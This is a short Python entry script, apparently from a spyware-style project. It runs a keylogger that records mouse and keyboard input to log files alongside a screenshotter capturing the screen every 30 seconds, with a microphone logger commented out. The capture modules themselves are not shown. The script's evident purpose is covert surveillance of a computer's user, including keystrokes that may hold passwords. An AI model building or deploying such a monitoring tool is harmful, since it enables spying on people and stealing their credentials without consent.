from keylogger import Keylogger
from screenshot import Screenshot
#from miclogger import MicLogger
# use multiprocessing to run threads at the same time
import multiprocessing


if __name__ == "__main__":
	keylogger = Keylogger("mouse_log.txt", "keyboard_log.txt")
	screenshot = Screenshot("Screenshots", 30, "screenshot_log.txt")
	klogger = multiprocessing.Process(target=keylogger.start_listener)
	slogger = multiprocessing.Process(target=screenshot.start_screenshoting)

	klogger.start()
	slogger.start()

	klogger.join()
	slogger.join()
